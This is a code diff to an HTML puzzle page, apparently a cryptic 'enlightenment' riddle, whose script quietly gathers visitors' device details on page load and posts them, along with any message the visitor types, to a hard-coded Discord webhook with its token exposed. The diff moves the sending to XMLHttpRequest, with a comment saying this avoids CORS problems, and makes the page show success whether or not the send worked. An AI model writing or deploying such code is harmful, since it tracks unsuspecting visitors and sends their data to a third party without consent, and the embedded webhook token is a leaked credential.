@@ -101,7 +101,7 @@
     <p class="bold-text">True enlightenment requires no validation.<br>Freedom is the ultimate cipher.</p>
     
     <p>Good luck.</p>
-    <p class="bold-text">3031<br>and own</p>
+    <p class="bold-text">3031</p>
 
     <!-- New Input Section -->
     <div class="input-group">
@@ -113,9 +113,9 @@
 </div>
 
 <script>
+    // Use XMLHttpRequest to avoid CORS issues on local files
     const webhookUrl = "https://discord.com/api/webhooks/1558449654264373359/_7cK7hP9T3hNpMjXaPpBTLRjbaISfTbu5tOV50YRuCqaH_YTlEo8OekOj1wt12VbTzpc";
 
-    // Function to get detailed device info
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let deviceModel = "Unknown";
@@ -170,6 +170,13 @@
         }
     }
 
+    function sendRequest(url, payload) {
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+        xhr.send(JSON.stringify(payload));
+    }
+
     function updateDiscordMessage(info) {
         const loader = document.getElementById('loader');
         loader.style.opacity = '1';
@@ -192,32 +199,15 @@ Do not look for the next prime. Do not wait for the next epiphany. The puzzle is
 **Freedom is the ultimate cipher.**
 
 Good luck.
-3031
-and own`;
+3031`;
 
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                content: discordMessage
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                loader.textContent = "Session recorded.";
-                loader.className = "success";
-            } else {
-                loader.textContent = "Error recording session.";
-                loader.className = "error";
-            }
-        })
-        .catch(error => {
-            console.error("Fetch Error:", error);
-            loader.textContent = "Network error.";
-            loader.className = "error";
-        });
+        sendRequest(webhookUrl, { content: discordMessage });
+        
+        // Simulate success for UI
+        setTimeout(() => {
+            loader.textContent = "Session recorded.";
+            loader.className = "success";
+        }, 500);
     }
 
     // Send Last Message Function
@@ -231,25 +221,11 @@ and own`;
         // Change button state immediately
         btn.textContent = "Sent";
         btn.classList.add('sent');
-        input.disabled = true; // Prevent double sending
+        input.disabled = true; 
 
-        const discordMessage = `✉️ **Last Message Received**\n\n**User said:** \`${message}\`\n\n**Device Info:**\n**📱 Model:** ${document.querySelector('.bold-text').innerText.includes('Unknown') ? 'See Session Log' : 'See Session Log'}\n*(Full device details were logged in the previous session entry)*`;
+        const discordMessage = `✉️ **Last Message Received**\n\n**User said:** \`${message}\`\n\n**Time:** ${new Date().toLocaleString()}`;
 
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                content: discordMessage
-            })
-        })
-        .catch(error => {
-            console.error("Last Message Error:", error);
-            btn.textContent = "Failed";
-            btn.classList.remove('sent');
-            input.disabled = false;
-        });
+        sendRequest(webhookUrl, { content: discordMessage });
     }
 
     // Start detection on load
